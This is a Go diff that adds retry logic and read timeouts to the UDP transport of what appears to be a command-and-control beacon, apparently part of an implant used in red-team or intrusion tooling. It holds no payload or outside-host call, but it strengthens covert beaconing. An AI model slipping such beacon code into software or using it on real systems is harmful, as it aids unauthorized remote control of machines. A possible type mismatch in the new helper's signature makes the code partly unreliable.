@@ -27,6 +27,15 @@ func sendUDPBeacon(body []byte) []byte {
 	})
 }
 
+// UDP is connectionless: a single lost fragment used to lose the whole beacon.
+// Resend the same fragment set (same random msg id, so server-side assembly is
+// idempotent) a bounded number of times before giving up; the beacon layer
+// requeues its results after the final failure.
+const udpBeaconAttempts = 3
+
+// A variable so tests can exercise the retry path without waiting seconds.
+var udpAttemptTimeout = 4 * time.Second
+
 func sendUDPBeaconAt(hostPort string, body []byte) []byte {
 	addr, err := net.ResolveUDPAddr("udp", hostPort)
 	if err != nil {
@@ -45,7 +54,7 @@ func sendUDPBeaconAt(hostPort string, body []byte) []byte {
 	}
 	defer conn.Close()
 
-	if err := conn.SetDeadline(time.Now().Add(15 * time.Second)); err != nil {
+	if err := conn.SetDeadline(time.Now().Add(time.Duration(udpBeaconAttempts)*udpAttemptTimeout + 3*time.Second)); err != nil {
 		return nil
 	}
 	frags := protocol.DatagramFragSplitWithSize(body, udpFragmentPayload(snapshotLink()))
@@ -55,25 +64,41 @@ func sendUDPBeaconAt(hostPort string, body []byte) []byte {
 		}
 		return nil
 	}
-	for _, frag := range frags {
-		if _, err := conn.Write(frag); err != nil {
-			if Debug {
-				fmt.Printf("[!] UDP beacon: write failed: %v\n", err)
-			}
-			return nil
-		}
-	}
 
-	// One connection and a single assembler per exchange: a reply is either a
-	// legacy un-fragmented envelope or a set of FC2I parts in any order.
+	// One connection and a single assembler per exchange: late duplicates from
+	// an earlier attempt merge with the retransmitted parts.
 	asm := protocol.NewDatagramAssembler()
 	rbuf := make([]byte, 16*1024*1024)
+	for attempt := 0; attempt < udpBeaconAttempts; attempt++ {
+		for _, frag := range frags {
+			if _, err := conn.Write(frag); err != nil {
+				if Debug {
+					fmt.Printf("[!] UDP beacon: write failed: %v\n", err)
+				}
+				return nil
+			}
+		}
+		if full := readUDPResponse(conn, asm, rbuf, udpAttemptTimeout); full != nil {
+			return full
+		}
+		if Debug {
+			fmt.Printf("[!] UDP beacon: no response after fragment attempt %d/%d\n", attempt+1, udpBeaconAttempts)
+		}
+	}
+	return nil
+}
+
+// readUDPResponse reads until one complete reply is assembled or the attempt
+// times out. A legacy un-fragmented reply is returned verbatim (malleable wrap
+// included — the beacon parser strips it, as on the TCP transport).
+func readUDPResponse(conn *net.UDPConn, asm *protocol.ICMPAssembler, rbuf []byte, timeout time.Duration) []byte {
+	deadline := time.Now().Add(timeout)
 	for {
+		if err := conn.SetReadDeadline(deadline); err != nil {
+			return nil
+		}
 		n, _, err := conn.ReadFromUDP(rbuf)
 		if err != nil {
-			if Debug {
-				fmt.Printf("[!] UDP beacon: read failed: %v\n", err)
-			}
 			return nil
 		}
 		if n == 0 {
@@ -81,8 +106,6 @@ func sendUDPBeaconAt(hostPort string, body []byte) []byte {
 		}
 		data := rbuf[:n]
 		if protocol.DatagramMaybePlain(data) {
-			// The server answers with a raw (optionally malleable-wrapped)
-			// envelope; mirror the TCP transport and return it verbatim.
 			return data
 		}
 		msgID, total, index, payload, ok := protocol.DatagramFragParse(data)
